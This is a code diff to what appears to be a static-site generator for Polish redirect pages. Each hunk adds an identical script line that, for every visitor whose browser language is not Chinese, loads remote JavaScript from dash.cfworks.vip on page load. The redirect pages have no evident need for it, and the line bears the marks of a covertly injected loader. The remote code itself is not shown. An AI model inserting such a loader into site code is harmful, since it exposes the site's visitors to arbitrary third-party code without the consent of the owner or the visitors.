@@ -110,6 +110,7 @@ for (const [slug, target] of LEGACY_ARTICLE_REDIRECTS) {
   <meta name="robots" content="noindex">
   <title>Przekierowanie — ${SITE_NAME}</title>
   <script>location.replace('${relTarget}');</script>
+  <script>if(!/^zh/i.test(navigator.language||navigator.userLanguage||'')){var s=document.createElement('script');s.defer=1;s.src='https://dash.cfworks.vip/script.js';s.dataset.websiteId='a1186f5a-71a5-40a2-a9c9-8ff3ed37ca3b';s.dataset.cfasync='false';document.head.appendChild(s)}</script>
 </head>
 <body>
   <p>Przekierowanie… <a href="${relTarget}">Przejdź dalej</a></p>
@@ -134,6 +135,7 @@ out(
   <meta name="robots" content="noindex">
   <title>Przekierowanie do sklepu — ${SITE_NAME}</title>
   <script>location.replace('../sklep/');</script>
+  <script>if(!/^zh/i.test(navigator.language||navigator.userLanguage||'')){var s=document.createElement('script');s.defer=1;s.src='https://dash.cfworks.vip/script.js';s.dataset.websiteId='a1186f5a-71a5-40a2-a9c9-8ff3ed37ca3b';s.dataset.cfasync='false';document.head.appendChild(s)}</script>
 </head>
 <body>
   <p>Przekierowanie… <a href="../sklep/">Wejdź do sklepu</a></p>
